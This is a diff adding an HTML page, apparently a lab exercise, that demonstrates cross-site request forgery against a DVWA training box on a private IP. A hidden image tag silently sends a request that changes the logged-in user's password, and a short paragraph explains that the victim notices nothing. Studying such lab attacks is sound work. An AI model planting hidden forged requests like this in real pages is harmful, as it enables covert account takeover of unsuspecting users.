@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>CSRF Demo</title>
+    <meta name="viewp
+    ort" content="width=device-width, initial-scale=1">
+    <!-- <link rel="stylesheet" type="text/css" media="screen" href="main.css" /> -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
+    <!-- <script src="main.js"></script> -->
+</head>
+<body>
+    <a href="/travels">Home</a>
+    <h3>Hello, I am testing this dvwa box for csrf!!!</h3>
+    <img style="display:none" src="http://192.168.209.134/dvwa/vulnerabilities/csrf/?password_new=1234&password_conf=1234&Change=Change#" alt="">
+    
+    img src="http://192.168.209.134/dvwa/vulnerabilities/csrf/?password_new=changeHERE&password_conf=changeHERE&Change=Change#" alt=""> <br><br>
+    
+    <h4>The DVWA security is set to LOW</h4>
+    <p>The user on the target website has no idea what is going on. You are just manipulating what is going on inside the target website 
+    without the user knowing what is going on. <br> The user sees nothing unusual here, the attacker changes the password remotely by manipulating
+    the current values to however he wants it.
+    </p>
+</body>
+</html>
